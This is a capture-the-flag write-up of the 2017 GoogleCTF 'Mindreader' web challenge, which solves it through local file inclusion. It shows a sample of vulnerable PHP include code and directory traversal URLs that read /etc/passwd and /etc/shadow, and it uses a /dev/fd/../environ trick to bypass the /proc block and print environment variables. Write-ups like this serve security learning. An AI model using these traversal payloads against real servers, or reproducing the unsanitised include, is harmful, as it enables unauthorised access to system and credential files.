---
layout:     post
title:      "GoogleCTF - Mindreader"
subtitle:   "Write-Ups"
date:       2017-06-19 8:00:00
author:     "W3ndige"
header-img: "img/googlectf-header.jpeg"
permalink: /:title/
category: GoogleCTF 2017
---


<h1>Introduction</h1>
<p>GoogleCTF from this year was hard. I couldn't solve most of the challenges, the ones that I made took me a lot of time to finish. But that's why we're here, to learn from a good challenge and from mistakes made during attacks. That's why I'm looking forward to write ups for other challenges and I'm publishing ones for the challenges, that I have finished. Let's start from the one with biggest number of solves - mindreader. </p>

{% highlight text %}
Can you read my mind?

Challenge running at https://mindreader.web.ctfcompetition.com/
{% endhighlight %}

<p>Quite descriptive, right?</p>

<h1>Mindreader - Easy</h1>

<p>Viewing the page provided in the challenge gives us a little input box. </p>

{% highlight html %}
<html>
<head>
</head>
<body>
    <p>Hello, what do you want to read?</p>
    <form method="GET">
        <input type="text" name="f">
        <input type="submit" value="Read">
    </form>
</body>
</html>
{% endhighlight %}

<p>Very simple, nothing hidden in the code, no external files so let's focus on the input. Entering some words, phrases in it doesn't seem to work - we always get redirected to the <b>Not Found</b> page. </p>

{% highlight html %}
https://mindreader.web.ctfcompetition.com/?f=flag

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.</p>
{% endhighlight %}

<p>Can it be a hint? Maybe the code is looking for a file in the server named just as in our input. If that's the case and code is not properly implemented, it can be vulnerable to <b>local file intrusion</b> attack. </p>

<p><b>LFI</b> occurs, when programmer does not correctly sanitaze the page include, which allows an attack to inject directory traversal characters and get system information essential to further exploit the server. Here you can see an example of such <b>bad code</b>. </p>

{% highlight php %}
<?php
 $file = $_GET['f'];
 if(isset($file))
 {
     include("$file");
 }
 else
 {
     include("index.php");
 }
?>
{% endhighlight %}

<p>As we now know the basics, let's try to get some files using this attack and see if it works. First one - <b>/etc/passwd</b>. To get this working you have to enter ../../../../etc/passwd path in the input box, click submit and webpage will redirect you to the file. That's how we'll be trying to access this and other resources.  </p>

{% highlight html %}
https://mindreader.web.ctfcompetition.com/?f=..%2F..%2F..%2F..%2Fetc%2Fpasswd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
{% endhighlight %}

<p>Great, we got it! But what can we do with it, there's no flag here so we have to keep looking further. I came with idea to grab <b>/etc/shadow</b> and then crack the passwords. </p>

{% highlight html %}
https://mindreader.web.ctfcompetition.com/?f=..%2F..%2F..%2F..%2Fetc%2Fshadow

root:*:17324:0:99999:7:::
daemon:*:17324:0:99999:7:::
bin:*:17324:0:99999:7:::
sys:*:17324:0:99999:7:::
sync:*:17324:0:99999:7:::
games:*:17324:0:99999:7:::
man:*:17324:0:99999:7:::
lp:*:17324:0:99999:7:::
mail:*:17324:0:99999:7:::
news:*:17324:0:99999:7:::
uucp:*:17324:0:99999:7:::
proxy:*:17324:0:99999:7:::
www-data:*:17324:0:99999:7:::
backup:*:17324:0:99999:7:::
list:*:17324:0:99999:7:::
irc:*:17324:0:99999:7:::
gnats:*:17324:0:99999:7:::
nobody:*:17324:0:99999:7:::
systemd-timesync:*:17324:0:99999:7:::
systemd-network:*:17324:0:99999:7:::
systemd-resolve:*:17324:0:99999:7:::
systemd-bus-proxy:*:17324:0:99999:7:::
{% endhighlight %}

<p>But this didn't work out. We have to keep looking further, maybe in the <b>.bashrc</b>? Any clues? </p>

{% highlight html %}
https://mindreader.web.ctfcompetition.com/?f=..%2F..%2F..%2F..%2Fetc%2Fbash.bashrc

# System-wide .bashrc file for interactive bash(1) shells.

# To enable the settings / commands in this file for login shells as well,
# this file has to be sourced in /etc/profile.

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, overwrite the one in /etc/profile)
PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '

# Commented out, don't overwrite xterm -T "title" -n "icontitle" by default.
# If this is an xterm set the title to user@host:dir
#case "$TERM" in
#xterm*|rxvt*)
#    PROMPT_COMMAND='echo -ne "\033]0;${USER}@${HOSTNAME}: ${PWD}\007"'
#    ;;
#*)
#    ;;
#esac

# enable bash completion in interactive shells
#if ! shopt -oq posix; then
#  if [ -f /usr/share/bash-completion/bash_completion ]; then
#    . /usr/share/bash-completion/bash_completion
#  elif [ -f /etc/bash_completion ]; then
#    . /etc/bash_completion
#  fi
#fi

# if the command-not-found package is installed, use it
if [ -x /usr/lib/command-not-found -o -x /usr/share/command-not-found/command-not-found ]; then
	function command_not_found_handle {
	        # check because c-n-f could've been removed in the meantime
                if [ -x /usr/lib/command-not-found ]; then
		   /usr/lib/command-not-found -- "$1"
                   return $?
                elif [ -x /usr/share/command-not-found/command-not-found ]; then
		   /usr/share/command-not-found/command-not-found -- "$1"
                   return $?
		else
		   printf "%s: command not found\n" "$1" >&2
		   return 127
		fi
	}
fi

{% endhighlight %}

<p>Nope. When trying <b>proc/version</b>, we get forbidden, so that's something new. </p>

{% highlight html %}
https://mindreader.web.ctfcompetition.com/?f=..%2F..%2F..%2F..%2Fproc%2Fversion

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don't have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
{% endhighlight %}

<p>Every file in <b>/proc</b> seems to be protected. But after good (and educational!) few hours of looking, I've managed to find something in Linux man pages. Let's take a look at <b>/proc/[pid]/environ</b>. </p>

{% highlight text %}
/proc/[pid]/environ
       This file contains the initial environment that was set when
       the currently executing program was started via execve(2).
       The entries are separated by null bytes ('\0'), and there may
       be a null byte at the end.  Thus, to print out the environment
       of process 1, you would do:

           $ strings /proc/1/environ

       If, after an execve(2), the process modifies its environment
       (e.g., by calling functions such as putenv(3) or modifying the
       environ(7) variable directly), this file will not reflect
       those changes.

       Furthermore, a process may change the memory location that
       this file refers via prctl(2) operations such as
       PR_SET_MM_ENV_START.

       Permission to access this file is governed by a ptrace access
       mode PTRACE_MODE_READ_FSCREDS check; see ptrace(2).
{% endhighlight %}

<p>As enviroment can be very useful, I decided that that's the path I wanna go in this challenge. But as <b>/proc</b> is forbidden, we have to find a different way. Here comes Stackoverflow to the rescue, let's look at this <a href="https://unix.stackexchange.com/questions/18255/how-does-dev-fd-relate-to-proc-self-fd"><b>thread</b></a>!</p>

<p>But trying <b>/dev/fd/environ</b> is once again - not found. I have to be missing something. Let's rethink that - we use a symlink to get into <b>/proc/self/fd</b>, and now we have to go back one directory and then jump to envrion. Got it! </p>

{% highlight html %}
https://mindreader.web.ctfcompetition.com/?f=%2Fdev%2Ffd%2F..%2Fenviron

GAE_MEMORY_MB=614HOSTNAME=a2c5f45b98c8GAE_INSTANCE=aef-mindreader--sss6w3uqjfrcntmn-20170618t144344-8r7fPORT=8080HOME=/rootPYTHONUNBUFFERED=1GAE_SERVICE=mindreader-sss6w3uqjfrcntmnPATH=/env/bin:/opt/python3.5/bin:/opt/python3.6/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binGAE_DEPLOYMENT_ID=402060873983974243LANG=C.UTF-8DEBIAN_FRONTEND=noninteractiveGCLOUD_PROJECT=ctf-web-kuqo48dGOOGLE_CLOUD_PROJECT=ctf-web-kuqo48dCHALLENGE_NAME=mindreaderVIRTUAL_ENV=/envPWD=/home/vmagent/appGAE_VERSION=20170618t144344FLAG=CTF{ee02d9243ed6dfcf83b8d520af8502e1}
{% endhighlight %}

<p>And along with the environ, there's a hidden flag! </p>
